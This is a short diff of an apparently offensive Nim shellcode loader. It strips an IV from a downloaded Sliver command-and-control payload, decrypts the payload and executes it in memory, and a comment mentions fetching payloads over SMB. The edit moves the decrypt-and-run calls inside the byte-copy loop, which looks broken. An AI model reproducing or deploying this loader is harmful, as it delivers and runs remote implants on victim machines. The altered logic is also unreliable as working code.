@@ -102,11 +102,9 @@ when isMainModule:
             #If Sliver remove the iv from first 16 bytes
             if ($paramStr(1) == "sliver"):                 
                 for i in 16  ..< shellcode.len:
-                    actual.add(shellcode[i])
-            
-            shellcode = 
-            decrypt(actual,key,iv)                   
-            runShellcode(shellcode)      
+                actual.add(shellcode[i])
+                shellcode =decrypt(actual,key,iv)
+                runShellcode(shellcode)      
         
         #Download the payload over smb  
         elif ($paramStr(3) == "smb"):
